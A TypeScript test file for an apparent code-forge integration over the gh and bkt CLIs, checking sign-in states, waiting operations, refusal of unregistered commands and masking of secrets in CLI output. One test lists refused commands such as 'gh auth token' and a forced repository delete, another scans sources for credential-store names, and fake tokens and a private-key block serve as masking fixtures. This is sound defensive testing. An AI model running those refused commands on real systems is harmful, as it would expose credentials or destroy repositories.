/**
 * The forge port over `gh` and `bkt` (#253): the CLI's state per repository from its own status,
 * each with its fixing command; an operation that waits on a signed-out CLI behind one Project
 * need, resumed by "Check again"; one runner that refuses an unregistered command shape before
 * spawning, never asks for a token and never reads a CLI's configuration; failures verbatim and
 * masked; timeouts as such; and the network writes registered exactly as CT-50 lists them.
 *
 * The CLIs are fakes first and alone on a `PATH` of their own (`fake-forge.ts`); no test runs a
 * real `gh` or `bkt`, and none reaches a forge.
 */

import {
  mkdirSync,
  readFileSync,
  readdirSync,
  realpathSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs'
import { join, sep } from 'node:path'

import { ProjectOwner } from '@hemera/core/domain'
import {
  ForgeError,
  ForgeRefused,
  type ForgeRepositoryStatus,
  type Need,
  ForgeTimeout,
  UnknownRepository,
} from '@hemera/ipc'
import { Effect, Fiber, Predicate, Schedule, Stream } from 'effect'
import { afterEach, beforeEach, describe, expect, test } from 'vite-plus/test'

import { readEvents } from '../src/engine/journal.ts'
import type { EngineServices } from '../src/engine/profile.ts'
import { listNeeds, retryNeed } from '../src/engine/needs.ts'
import { ForgePort, contextLine, forgeError } from '../src/engine/forges/port.ts'
import { ForgeCommandRefused, ForgeRunner } from '../src/engine/forges/runner.ts'
import { COMMAND_SHAPES } from '../src/engine/forges/shapes.ts'
import { createProject, getProject, removeRepository } from '../src/engine/projects.ts'
import { listActions } from '../src/engine/tools/actions.ts'
import { commandsEngine } from './commands-engine.ts'
import {
  type FakeForge,
  type FakeRule,
  WATCHED_ENV,
  BKT_CLOUD,
  bktReady,
  fakeForge,
  ghReady,
  ghSignedOut,
} from './fake-forge.ts'
import { git } from './repositories.ts'
import { removeFolders, temporaryFolder } from './storage.ts'

let data: string
let work: string
beforeEach(() => {
  data = realpathSync.native(temporaryFolder('forge'))
  work = realpathSync.native(temporaryFolder('forge-work'))
})
afterEach(removeFolders)

/** A main checkout with a repository per remote URL, each named by its key. */
const checkout = (remotes: Readonly<Record<string, string>>) => {
  const main = join(work, 'atlas')
  for (const [path, url] of Object.entries(remotes)) {
    const folder = join(main, path)
    mkdirSync(folder, { recursive: true })
    git(folder, 'init', '-q', '-b', 'main')
    git(folder, 'commit', '-q', '--allow-empty', '-m', 'base')
    git(folder, 'remote', 'add', 'origin', url)
  }
  return main
}

const REMOTES = {
  shop: 'git@github.com:acme/shop.git',
  api: 'https://bitbucket.org/acme-team/api.git',
}

/** The engine over these fakes, with Atlas made of the repositories given; limits shortened. */
const withForge = <A, E>(
  fake: FakeForge,
  program: (atlas: {
    readonly projectId: string
    readonly repository: (path: string) => string
  }) => Effect.Effect<A, E, EngineServices>,
  remotes: Readonly<Record<string, string>> = REMOTES,
  limits = { read: 2_000, write: 4_000 },
) => {
  const main = checkout(remotes)
  return commandsEngine(data, { forge: { env: fake.env, limits } })(({ profile }) =>
    profile.use(
      Effect.gen(function* () {
        const project = yield* createProject({
          name: 'Atlas',
          mainCheckout: main,
          repositories: Object.keys(remotes),
        })
        const repository = (path: string) => {
          const found = project.repositories.find((one) => one.path === path)
          if (found === undefined) throw new Error(`no repository ${path}`)
          return found.id
        }
        return yield* program({ projectId: project.id, repository })
      }),
    ),
  )
}

/** A word of a line to copy, quoted as the shell of this platform needs it. */
const q = (word: string): string => (process.platform === 'win32' ? `"${word}"` : `'${word}'`)

const byPath = (statuses: ReadonlyArray<ForgeRepositoryStatus>) =>
  Object.fromEntries(statuses.map((status) => [status.path, status]))

const forge = Effect.gen(function* () {
  return yield* ForgePort
})
const runner = Effect.gen(function* () {
  return yield* ForgeRunner
})

describe('Ready, missing, signed-out and unreachable come from the fake CLI, each with its fix', () => {
  test('gh and bkt signed in are ready, with their versions, CRLF and all', async () => {
    const fake = fakeForge([...ghReady(), ...bktReady()])
    const statuses = await withForge(fake, ({ projectId }) =>
      Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
    )
    expect(byPath(statuses)).toEqual({
      shop: {
        repositoryId: expect.any(String),
        path: 'shop',
        forge: 'github',
        host: 'github.com',
        owner: 'acme',
        slug: 'shop',
        forced: false,
        cli: 'gh',
        version: '2.100.0',
        state: 'ready',
        fix: null,
        detail: null,
      },
      api: {
        repositoryId: expect.any(String),
        path: 'api',
        forge: 'bitbucket-cloud',
        host: 'bitbucket.org',
        owner: 'acme-team',
        slug: 'api',
        forced: false,
        cli: 'bkt',
        version: '0.26.0',
        state: 'ready',
        fix: null,
        detail: null,
      },
    })
  })

  test('a CLI absent from the PATH is missing, with the install line for the OS', async () => {
    const fake = fakeForge([], [])
    const statuses = byPath(
      await withForge(fake, ({ projectId }) =>
        Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
      ),
    )
    expect(statuses['shop']).toMatchObject({ state: 'missing', version: null })
    expect(statuses['api']).toMatchObject({ state: 'missing', version: null })
    const gh = statuses['shop']?.fix ?? ''
    const bkt = statuses['api']?.fix ?? ''
    if (process.platform === 'win32') {
      expect(gh).toBe('winget install --id GitHub.cli')
      expect(bkt).toBe('winget install AvivSinai.Bitbucket-CLI')
    } else if (process.platform === 'darwin') {
      expect(gh).toBe('brew install gh')
      expect(bkt).toBe('brew install bitbucket-cli')
    } else {
      expect(['sudo pacman -S github-cli', 'sudo apt install gh']).toContain(gh)
      expect(bkt).toBe('brew install bitbucket-cli')
    }
  })

  test('no account for the host is signed-out, with the login command for that host', async () => {
    const fake = fakeForge([
      ...ghSignedOut(),
      { cli: 'bkt', when: ['--version'], stdout: 'bkt version 0.26.0\n' },
      { cli: 'bkt', when: ['auth', 'status'], stdout: '{"hosts":[],"contexts":[]}\n' },
    ])
    const statuses = byPath(
      await withForge(fake, ({ projectId }) =>
        Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
      ),
    )
    expect(statuses['shop']).toMatchObject({
      state: 'signed-out',
      fix: 'gh auth login --hostname github.com',
    })
    expect(statuses['api']).toMatchObject({
      state: 'signed-out',
      fix: 'bkt auth login https://bitbucket.org --kind cloud --web',
    })
  })

  test('Bitbucket Data Center signed out gives the login with its host', async () => {
    const fake = fakeForge(bktReady([BKT_CLOUD]))
    const statuses = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.flatMap(forge, (port) =>
          port.setForced(projectId, repository('dc'), 'bitbucket-datacenter', 'git.acme.test'),
        ),
      { dc: 'ssh://git@git.acme.test:7999/proj/dc.git' },
    )
    expect(byPath(statuses)['dc']).toMatchObject({
      forge: 'bitbucket-datacenter',
      host: 'git.acme.test',
      forced: true,
      state: 'signed-out',
      fix: 'bkt auth login https://git.acme.test',
    })
  })

  test.each([
    [
      'a host and its HTTP port, the remote on the SSH port',
      'https://git.acme.test:7990',
      'git.acme.test',
    ],
    ['a context path', 'https://git.acme.test/bitbucket', 'git.acme.test'],
    ['the host forced with its port', 'https://git.acme.test:7990', 'git.acme.test:7990'],
  ])('Bitbucket Data Center under %s is ready', async (_case, base, forced) => {
    const fake = fakeForge(bktReady([BKT_CLOUD, { base, kind: 'dc' }]))
    const statuses = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.flatMap(forge, (port) =>
          port.setForced(projectId, repository('dc'), 'bitbucket-datacenter', forced),
        ),
      { dc: 'ssh://git@git.acme.test:7999/proj/dc.git' },
    )
    expect(byPath(statuses)['dc']).toMatchObject({ state: 'ready', fix: null })
  })

  test('Bitbucket Cloud is not ready on a Data Center login, nor the reverse', async () => {
    const fake = fakeForge(bktReady([{ base: 'https://git.acme.test:7990', kind: 'dc' }]))
    const statuses = await withForge(
      fake,
      ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
      { api: REMOTES.api },
    )
    expect(byPath(statuses)['api']?.state).toBe('signed-out')
  })

  test('a check that cannot reach the forge is unreachable, with what the CLI said', async () => {
    const fake = fakeForge([
      { cli: 'gh', when: ['--version'], stdout: 'gh version 2.100.0 (2026-09-30)\n' },
      {
        cli: 'gh',
        when: ['auth', 'status'],
        stderr: 'error connecting to api.github.com\ncheck your internet connection\n',
        code: 1,
      },
    ])
    const statuses = byPath(
      await withForge(
        fake,
        ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
        { shop: REMOTES.shop },
      ),
    )
    expect(statuses['shop']).toMatchObject({
      state: 'unreachable',
      fix: null,
      detail: 'error connecting to api.github.com\ncheck your internet connection',
    })
  })

  test('a check cut at its limit is unreachable too', async () => {
    const fake = fakeForge([
      { cli: 'gh', when: ['--version'], stdout: 'gh version 2.100.0 (2026-09-30)\n' },
      { cli: 'gh', when: ['auth', 'status'], hang: true },
    ])
    const statuses = byPath(
      await withForge(
        fake,
        ({ projectId }) => Effect.flatMap(forge, (port) => port.checkAgain(projectId, null)),
        { shop: REMOTES.shop },
        { read: 500, write: 1_000 },
      ),
    )
    expect(statuses['shop']?.state).toBe('unreachable')
  })

  test('a repository whose forge is forced to none needs no CLI', async () => {
    const fake = fakeForge([], [])
    const statuses = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.flatMap(forge, (port) =>
          port.setForced(projectId, repository('shop'), 'none', null),
        ),
      { shop: REMOTES.shop },
    )
    expect(byPath(statuses)['shop']).toMatchObject({
      forge: 'none',
      forced: true,
      cli: null,
      state: 'not-needed',
      fix: null,
    })
    expect(fake.calls()).toEqual([])
  })
})

describe('An operation with the CLI signed out waits behind one Project need', () => {
  test('two operations wait, one need is made; Check again after sign-in clears it and resumes them', async () => {
    const fake = fakeForge(ghSignedOut())
    const { logins, before, after } = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          const first = yield* Effect.forkChild(port.currentUser(repository('shop')))
          const second = yield* Effect.forkChild(port.currentUser(repository('shop')))
          const pending = listNeeds.pipe(
            Effect.map((groups) => groups.flatMap((group) => group.needs)),
          )
          const waiting = yield* pending.pipe(
            Effect.repeat({
              schedule: Schedule.spaced('50 millis'),
              until: (needs) => needs.length > 0,
            }),
          )
          // Both are still waiting, behind the same need.
          yield* Effect.sleep('300 millis')
          const pendingBefore = yield* pending
          expect(first.pollUnsafe()).toBeUndefined()
          expect(second.pollUnsafe()).toBeUndefined()
          expect(waiting[0]?.owner).toEqual(ProjectOwner.make({ projectId }))
          fake.answer(ghReady())
          yield* port.checkAgain(projectId, null)
          const joined = yield* Fiber.joinAll([first, second])
          return { logins: joined, before: pendingBefore, after: yield* pending }
        }),
      { shop: REMOTES.shop },
    )
    expect(logins).toEqual(['octo', 'octo'])
    expect(before).toHaveLength(1)
    expect(Predicate.isTagged(before[0]?.fields, 'Environment')).toBe(true)
    expect(before[0]?.fields).toMatchObject({
      action: expect.stringContaining('gh auth login --hostname github.com'),
    })
    expect(after).toEqual([])
  })

  test('Retry on the need is Check again', async () => {
    const fake = fakeForge(ghSignedOut())
    const login = await withForge(
      fake,
      ({ repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          const waiting = yield* Effect.forkChild(port.currentUser(repository('shop')))
          const [need] = yield* listNeeds.pipe(
            Effect.map((groups) => groups.flatMap((group) => group.needs)),
            Effect.repeat({
              schedule: Schedule.spaced('50 millis'),
              until: (needs) => needs.length > 0,
            }),
          )
          fake.answer(ghReady())
          const retried = yield* retryNeed(need?.id ?? '')
          expect(retried.state).toBe('withdrawn')
          return yield* Fiber.join(waiting)
        }),
      { shop: REMOTES.shop },
    )
    expect(login).toBe('octo')
  })
})

/** The pending needs of the Profile. */
const pendingNeeds = listNeeds.pipe(Effect.map((groups) => groups.flatMap((group) => group.needs)))

/** Waits until a need is pending, and answers the pending ones. */
const someNeed = pendingNeeds.pipe(
  Effect.repeat({ schedule: Schedule.spaced('50 millis'), until: (needs) => needs.length > 0 }),
)

describe('A waiting operation survives a restart and wakes on any change', () => {
  test('after a restart, a new operation finds the need left and makes no second; Check again withdraws it', async () => {
    const fake = fakeForge(ghSignedOut())
    const main = checkout({ shop: REMOTES.shop })
    const engine = commandsEngine(data, {
      forge: { env: fake.env, limits: { read: 2_000, write: 4_000 } },
    })
    const { projectId, repositoryId } = await engine(({ profile }) =>
      profile.use(
        Effect.gen(function* () {
          const project = yield* createProject({
            name: 'Atlas',
            mainCheckout: main,
            repositories: ['shop'],
          })
          const only = project.repositories[0]?.id ?? ''
          const port = yield* forge
          yield* Effect.forkChild(port.currentUser(only))
          yield* someNeed
          return { projectId: project.id, repositoryId: only }
        }),
      ),
    )
    const { login, during, after } = await engine(({ profile }) =>
      profile.use(
        Effect.gen(function* () {
          const port = yield* forge
          const waiting = yield* Effect.forkChild(port.currentUser(repositoryId))
          yield* Effect.sleep('500 millis')
          const pendingDuring = yield* pendingNeeds
          fake.answer(ghReady())
          yield* port.checkAgain(projectId, null)
          return {
            login: yield* Fiber.join(waiting),
            during: pendingDuring,
            after: yield* pendingNeeds,
          }
        }),
      ),
    )
    expect(during).toHaveLength(1)
    expect(login).toBe('octo')
    expect(after).toEqual([])
  })

  test('the forge forced to none: the waiting operation is refused and its need withdrawn', async () => {
    const fake = fakeForge(ghSignedOut())
    const { failure, after } = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          const waiting = yield* Effect.forkChild(Effect.flip(port.currentUser(repository('shop'))))
          yield* someNeed
          yield* port.setForced(projectId, repository('shop'), 'none', null)
          return { failure: yield* Fiber.join(waiting), after: yield* pendingNeeds }
        }),
      { shop: REMOTES.shop },
    )
    expect(failure).toBeInstanceOf(ForgeRefused)
    expect(after).toEqual([])
  })

  test('the repository removed: the waiting operation ends and its need is withdrawn', async () => {
    const fake = fakeForge(ghSignedOut())
    const { failure, after } = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          const waiting = yield* Effect.forkChild(Effect.flip(port.currentUser(repository('shop'))))
          yield* someNeed
          const project = yield* getProject(projectId)
          yield* removeRepository({ id: repository('shop'), version: project.version })
          return { failure: yield* Fiber.join(waiting), after: yield* pendingNeeds }
        }),
      { shop: REMOTES.shop, api: REMOTES.api },
    )
    expect(failure).toBeInstanceOf(UnknownRepository)
    expect(after).toEqual([])
  })
})

/** What each pending need says is missing. */
const missingOf = (pending: ReadonlyArray<Need>) =>
  pending.map((need) =>
    Predicate.isTagged(need.fields, 'Environment') ? need.fields.missing : null,
  )

/**
 * Two openings of the engine over one data folder: the first leaves an operation waiting on each
 * repository given, then stops; the second runs the program with its start held before its own
 * recheck of the environment needs, so that the forge port knows only what the program checks.
 */
const restartedWith = async <A, E>(
  fake: FakeForge,
  remotes: Readonly<Record<string, string>>,
  needsLeft: number,
  program: (atlas: {
    readonly projectId: string
    readonly repository: (path: string) => string
  }) => Effect.Effect<A, E, EngineServices>,
) => {
  const main = checkout(remotes)
  const forgeParts = { env: fake.env, limits: { read: 2_000, write: 4_000 } }
  const { projectId, ids } = await commandsEngine(data, { forge: forgeParts })(({ profile }) =>
    profile.use(
      Effect.gen(function* () {
        const project = yield* createProject({
          name: 'Atlas',
          mainCheckout: main,
          repositories: Object.keys(remotes),
        })
        const port = yield* forge
        for (const one of project.repositories) yield* Effect.forkChild(port.currentUser(one.id))
        yield* pendingNeeds.pipe(
          Effect.repeat({
            schedule: Schedule.spaced('50 millis'),
            until: (pending) => pending.length >= needsLeft,
          }),
        )
        return {
          projectId: project.id,
          ids: new Map(project.repositories.map((one) => [one.path, one.id])),
        }
      }),
    ),
  )
  const repository = (path: string) => ids.get(path) ?? ''
  return commandsEngine(data, {
    forge: forgeParts,
    // The start's chain waits here, before it checks the environment needs again.
    sessions: { rebuildHold: Effect.never },
  })(({ profile }) => profile.use(program({ projectId, repository })))
}

const BKT_SIGNED_OUT = bktReady([], [])
const TWO_ON_GITHUB = { shop: REMOTES.shop, web: 'https://github.com/acme/web.git' }

describe('A check after a restart settles only the needs whose CLI and host it checked', () => {
  test('two repositories on two hosts each wait behind a need; checking one leaves the other’s need', async () => {
    const fake = fakeForge([...ghSignedOut(), ...BKT_SIGNED_OUT])
    const { afterShop, afterApi } = await restartedWith(
      fake,
      REMOTES,
      2,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          fake.answer([...ghReady(), ...BKT_SIGNED_OUT])
          yield* port.checkAgain(projectId, repository('shop'))
          const shopChecked = yield* pendingNeeds
          fake.answer([...ghReady(), ...bktReady()])
          yield* port.checkAgain(projectId, repository('api'))
          return { afterShop: shopChecked, afterApi: yield* pendingNeeds }
        }),
    )
    expect(missingOf(afterShop)).toEqual(['bkt signed in on bitbucket.org'])
    expect(afterApi).toEqual([])
  })

  test('the need pending, its repository still signed out: checking it keeps the need', async () => {
    const fake = fakeForge(ghSignedOut())
    const pending = await restartedWith(fake, TWO_ON_GITHUB, 1, ({ projectId, repository }) =>
      Effect.gen(function* () {
        const port = yield* forge
        yield* port.checkAgain(projectId, repository('shop'))
        return yield* pendingNeeds
      }),
    )
    expect(missingOf(pending)).toEqual(['gh signed in on github.com'])
  })

  test('forced to none while another repository not checked since the restart still waits: the need stays, then goes with the last', async () => {
    const fake = fakeForge(ghSignedOut())
    const { oneForced, bothForced } = await restartedWith(
      fake,
      TWO_ON_GITHUB,
      1,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.setForced(projectId, repository('shop'), 'none', null)
          const first = yield* pendingNeeds
          yield* port.setForced(projectId, repository('web'), 'none', null)
          return { oneForced: first, bothForced: yield* pendingNeeds }
        }),
    )
    expect(missingOf(oneForced)).toEqual(['gh signed in on github.com'])
    expect(bothForced).toEqual([])
  })

  test('an operation waiting after the restart, its repository removed: the need stays for the other', async () => {
    const fake = fakeForge(ghSignedOut())
    const { failure, pending } = await restartedWith(
      fake,
      TWO_ON_GITHUB,
      1,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.checkAgain(projectId, repository('shop'))
          const waiting = yield* Effect.forkChild(Effect.flip(port.currentUser(repository('shop'))))
          const project = yield* getProject(projectId)
          yield* removeRepository({ id: repository('shop'), version: project.version })
          return { failure: yield* Fiber.join(waiting), pending: yield* pendingNeeds }
        }),
    )
    expect(failure).toBeInstanceOf(UnknownRepository)
    expect(missingOf(pending)).toEqual(['gh signed in on github.com'])
  })

  test('both repositories removed after the restart: Retry withdraws the need', async () => {
    const fake = fakeForge(ghSignedOut())
    const { kept, retried } = await restartedWith(
      fake,
      TWO_ON_GITHUB,
      1,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          yield* removeRepository({
            id: repository('shop'),
            version: (yield* getProject(projectId)).version,
          })
          const [need] = yield* pendingNeeds
          const stays = yield* retryNeed(need?.id ?? '')
          yield* removeRepository({
            id: repository('web'),
            version: (yield* getProject(projectId)).version,
          })
          return { kept: stays.state, retried: (yield* retryNeed(need?.id ?? '')).state }
        }),
    )
    expect(kept).toBe('pending')
    expect(retried).toBe('withdrawn')
  })
})

describe('The runner never asks for a token and never reads a CLI configuration', () => {
  test('no auth token, no token variable, the user’s own configuration folder left as it is', async () => {
    const fake = fakeForge([...ghReady(), ...bktReady()])
    await withForge(fake, ({ projectId, repository }) =>
      Effect.gen(function* () {
        const port = yield* forge
        yield* port.checkAgain(projectId, null)
        yield* port.currentUser(repository('shop'))
        yield* port.currentUser(repository('api'))
      }),
    )
    const calls = fake.calls()
    expect(calls.length).toBeGreaterThan(0)
    for (const call of calls) {
      expect(call.args.join(' ')).not.toMatch(/\btoken\b/)
      for (const name of WATCHED_ENV.filter((one) => one.endsWith('TOKEN'))) {
        expect(call.env[name]).toBeNull()
      }
      expect(call.env['GH_CONFIG_DIR']).toBe(fake.userConfig)
      expect(call.env['BKT_CONFIG_DIR']).toBeNull()
    }
  })

  test('no forge source reads a CLI’s configuration, its keyring, or asks for its token', () => {
    const folder = join(import.meta.dirname, '../src/engine/forges')
    for (const file of readdirSync(folder)) {
      const source = readFileSync(join(folder, file), 'utf8')
      expect(source, file).not.toMatch(/node:fs|hosts\.yml|keytar|keyring\.|'token'/)
    }
  })
})

describe('A command shape not registered is refused before spawning', () => {
  test.each([
    [['auth', 'token']],
    [['api', '--hostname', 'github.com', 'user', '--method', 'POST']],
    [['repo', 'delete', 'acme/shop', '--yes']],
    [['pr', 'comment', '7', '--body', 'hello']],
  ])('gh %j', async (args) => {
    const fake = fakeForge(ghReady())
    const refused = await withForge(
      fake,
      ({ projectId }) =>
        Effect.flip(
          Effect.flatMap(runner, (forgeRunner) =>
            forgeRunner.run({ cli: 'gh', forge: 'github', host: 'github.com', projectId, args }),
          ),
        ),
      { shop: REMOTES.shop },
    )
    expect(refused).toBeInstanceOf(ForgeCommandRefused)
    expect(fake.calls()).toEqual([])
  })
})

describe('The registered write shapes equal CT-50’s list', () => {
  test('every network write is the push, a pull request operation, or an action on the remote', () => {
    // CT-50, written out here rather than imported: a write shape added outside it fails this test.
    const CT_50 = [
      'git:push',
      'gh:pr.create',
      'gh:pr.edit',
      'gh:pr.attach',
      'gh:pr.merge',
      'gh:workflow.run',
      'gh:run.rerun',
      'gh:deployment.approve',
      'bkt:pr.create',
      'bkt:pr.edit',
      'bkt:pr.merge',
      'bkt:pipeline.run',
    ]
    const writes = COMMAND_SHAPES.filter((shape) => shape.class === 'network-write').map(
      (shape) => `${shape.cli}:${shape.operation}`,
    )
    expect([...new Set(writes)].toSorted()).toEqual(CT_50.toSorted())
  })

  test('a write is recorded with its intent and its outcome', async () => {
    const fake = fakeForge([
      ...ghReady(),
      { cli: 'gh', when: ['workflow', 'run'], stdout: 'Created workflow_dispatch event\n' },
    ])
    const actions = await withForge(
      fake,
      ({ projectId }) =>
        Effect.gen(function* () {
          const forgeRunner = yield* ForgeRunner
          yield* forgeRunner.run({
            cli: 'gh',
            forge: 'github',
            host: 'github.com',
            projectId,
            args: [
              'workflow',
              'run',
              'release.yml',
              '--repo',
              'github.com/acme/shop',
              '--ref',
              'main',
            ],
          })
          return yield* listActions()
        }),
      { shop: REMOTES.shop },
    )
    expect(actions.map((action) => [action.kind, action.state])).toEqual([
      ['forge.workflow.run', 'done'],
    ])
  })
})

describe('A failure shows stderr verbatim with a ghp_ value masked', () => {
  test('ForgeError carries the forge’s message as it is, the token masked', async () => {
    const token = `ghp_${'a1B2c3D4e5'.repeat(4)}`
    const fake = fakeForge([
      ...ghReady().filter((rule) => !rule.when.includes('user')),
      {
        cli: 'gh',
        when: ['api', 'user'],
        stderr: `HTTP 401: Bad credentials (https://api.github.com/user)\nthe token ${token} was refused\n`,
        code: 1,
      } satisfies FakeRule,
    ])
    const failure = await withForge(
      fake,
      ({ repository }) =>
        Effect.flip(Effect.flatMap(forge, (port) => port.currentUser(repository('shop')))),
      { shop: REMOTES.shop },
    )
    expect(failure).toBeInstanceOf(ForgeError)
    expect(failure).toMatchObject({
      forge: 'github',
      host: 'github.com',
      exitCode: 1,
      message: 'HTTP 401: Bad credentials (https://api.github.com/user)\nthe token ••• was refused',
    })
    expect(JSON.stringify(failure)).not.toContain(token)
  })
})

describe('What a CLI prints and the command it ran are masked', () => {
  test('a credential in a command is masked in its ForgeError', async () => {
    const fake = fakeForge([
      ...ghReady(),
      { cli: 'gh', when: ['pr', 'create'], stderr: 'pull request create failed\n', code: 1 },
    ])
    const failure = await withForge(
      fake,
      ({ repository }) =>
        Effect.flip(
          Effect.flatMap(forge, (port) =>
            port.operate(repository('shop'), (target, run) =>
              run(
                [
                  'pr',
                  'create',
                  '--repo',
                  'github.com/acme/shop',
                  '--base',
                  'main',
                  '--head',
                  'feat/export',
                  '--title',
                  'from https://someone:hunter22secret@git.acme.test/acme/shop.git',
                  '--body-file',
                  '-',
                ],
                'Why',
              ).pipe(Effect.flatMap((answer) => Effect.fail(forgeError(target, answer)))),
            ),
          ),
        ),
      { shop: REMOTES.shop },
    )
    expect(failure).toBeInstanceOf(ForgeError)
    expect(failure).toMatchObject({ exitCode: 1, message: 'pull request create failed' })
    expect(JSON.stringify(failure)).not.toContain('hunter22secret')
  })

  test('what a CLI prints on its output is masked before it leaves the runner', async () => {
    const token = `ghp_${'Z9y8X7w6V5'.repeat(4)}`
    const fake = fakeForge([
      ...ghReady().filter((rule) => !rule.when.includes('user')),
      { cli: 'gh', when: ['api', 'user'], stdout: `octo ${token}\n` },
    ])
    const login = await withForge(
      fake,
      ({ repository }) => Effect.flatMap(forge, (port) => port.currentUser(repository('shop'))),
      { shop: REMOTES.shop },
    )
    expect(login).toBe('octo •••')
  })

  test('a JSON answer is masked value by value and still read', async () => {
    const token = `BBDC-${'MDEyMzQ1Njc4OTAx'.repeat(2)}`
    const fake = fakeForge([
      { cli: 'bkt', when: ['--version'], stdout: 'bkt version 0.26.0\n' },
      {
        cli: 'bkt',
        when: ['auth', 'status'],
        stdout: JSON.stringify({
          hosts: [
            {
              key: 'git.acme.test:7990',
              kind: 'dc',
              base_url: 'https://git.acme.test:7990',
              username: `octo ${token}`,
              auth_method: 'bearer',
              token_source: 'keyring',
            },
          ],
          contexts: [{ name: 'work', host: 'git.acme.test:7990', active: true }],
        }),
      },
    ])
    const login = await withForge(
      fake,
      ({ projectId, repository }) =>
        Effect.gen(function* () {
          const port = yield* forge
          yield* port.setForced(
            projectId,
            repository('dc'),
            'bitbucket-datacenter',
            'git.acme.test',
          )
          return yield* port.currentUser(repository('dc'))
        }),
      { dc: 'ssh://git@git.acme.test:7999/proj/dc.git' },
    )
    expect(login).toBe('octo •••')
  })

  test('the last lines of a long standard error are kept', async () => {
    const lines = Array.from({ length: 3000 }, (_, at) => `line ${String(at)}`)
    const fake = fakeForge([
      ...ghReady().filter((rule) => !rule.when.includes('user')),
      { cli: 'gh', when: ['api', 'user'], stderr: `${lines.join('\n')}\nthe last line\n`, code: 1 },
    ])
    const failure = await withForge(
      fake,
      ({ repository }) =>
        Effect.flip(Effect.flatMap(forge, (port) => port.currentUser(repository('shop')))),
      { shop: REMOTES.shop },
    )
    expect(failure).toBeInstanceOf(ForgeError)
    expect(failure.message.endsWith('line 2999\nthe last line')).toBe(true)
  })
})

describe('A JSON answer of any shape is masked value by value and stays JSON', () => {
  /** What the runner gives back of `gh api … user` when the fake prints this. */
  const printed = (stdout: string) => {
    const fake = fakeForge([{ cli: 'gh', when: ['api', 'user'], stdout }])
    return withForge(
      fake,
      ({ projectId }) =>
        Effect.flatMap(runner, (forgeRunner) =>
          forgeRunner.run({
            cli: 'gh',
            forge: 'github',
            host: 'github.com',
            projectId,
            args: ['api', '--hostname', 'github.com', 'user', '--jq', '.login'],
          }),
        ),
      { shop: REMOTES.shop },
    ).then((answer) => answer.stdout)
  }

  const token = `ghp_${'Q1w2E3r4T5'.repeat(4)}`
  /** A field named as a credential, and a body that quotes a password with escaped quotes. */
  const item = (at: number) => ({
    number: at,
    token: `plain-${String(at)}`,
    body: `set password="x${String(at)}" then ${token}`,
  })
  const masked = (at: number) => ({ number: at, token: '•••', body: 'set password=••• then •••' })

  test('a top-level array, as gh --json lists print it', async () => {
    const stdout = await printed(`${JSON.stringify([item(1), item(2)], null, 2)}\n`)
    expect(JSON.parse(stdout)).toEqual([masked(1), masked(2)])
  })

  test('a top-level object holding an array', async () => {
    const stdout = await printed(JSON.stringify({ items: [item(1)] }))
    expect(JSON.parse(stdout)).toEqual({ items: [masked(1)] })
  })

  test.each([
    [JSON.stringify(item(1).body), masked(1).body],
    ['42\n', 42],
    ['null\n', null],
  ])('a top-level string, number or null: %j', async (stdout, expected) => {
    expect(JSON.parse(await printed(stdout))).toEqual(expected)
  })

  test('NDJSON, as --jq prints it, line by line', async () => {
    const lines = [item(1), item(2), item(3).body].map((one) => JSON.stringify(one))
    const stdout = await printed(`${lines.join('\n')}\n`)
    expect(stdout.split('\n').map((line) => JSON.parse(line))).toEqual([
      masked(1),
      masked(2),
      masked(3).body,
    ])
  })

  test('a line of NDJSON that is no JSON is masked as text', async () => {
    const stdout = await printed(
      `${JSON.stringify(item(1))}\nwarning: token=${token}\n${JSON.stringify(item(2))}\n`,
    )
    const [first, text, last] = stdout.split('\n')
    expect(JSON.parse(first ?? '')).toEqual(masked(1))
    expect(text).toBe('warning: token=•••')
    expect(JSON.parse(last ?? '')).toEqual(masked(2))
  })

  test('a private key printed as text is masked whole, across its lines', async () => {
    const block = [
      '-----BEGIN OPENSSH PRIVATE KEY-----',
      'b3BlbnNzaC1rZXktdjEAAAAA',
      'QUJDREVGR0hJ',
      '-----END OPENSSH PRIVATE KEY-----',
    ]
    const stdout = await printed(`{"a": 1}\n${block.join('\n')}\n`)
    expect(stdout).toBe('{"a":1}\n•••')
  })
})

describe('A timeout gives ForgeTimeout, not a success', () => {
  test('a read cut at its limit', async () => {
    const fake = fakeForge([
      ...ghReady().filter((rule) => !rule.when.includes('user')),
      { cli: 'gh', when: ['api', 'user'], hang: true },
    ])
    const failure = await withForge(
      fake,
      ({ repository }) =>
        Effect.flip(Effect.flatMap(forge, (port) => port.currentUser(repository('shop')))),
      { shop: REMOTES.shop },
      { read: 1_000, write: 2_000 },
    )
    expect(failure).toBeInstanceOf(ForgeTimeout)
    expect(failure).toMatchObject({ seconds: 1 })
  })
})

describe('Capabilities follow the forge, its host and the CLI version', () => {
  test('GitHub on github.com at 2.100.0 attaches; Bitbucket Cloud runs pipelines but approves nothing', async () => {
    const fake = fakeForge([...ghReady(), ...bktReady()])
    const [github, cloud] = await withForge(fake, ({ repository }) =>
      Effect.flatMap(forge, (port) =>
        Effect.all([port.capabilities(repository('shop')), port.capabilities(repository('api'))]),
      ),
    )
    expect(github).toEqual({
      runWorkflow: true,
      rerun: true,
      approveManualStep: true,
      attachImage: true,
      readBuildStatuses: true,
      cliVersion: '2.100.0',
    })
    expect(cloud).toEqual({
      runWorkflow: true,
      rerun: true,
      approveManualStep: false,
      attachImage: false,
      readBuildStatuses: true,
      cliVersion: '0.26.0',
    })
  })

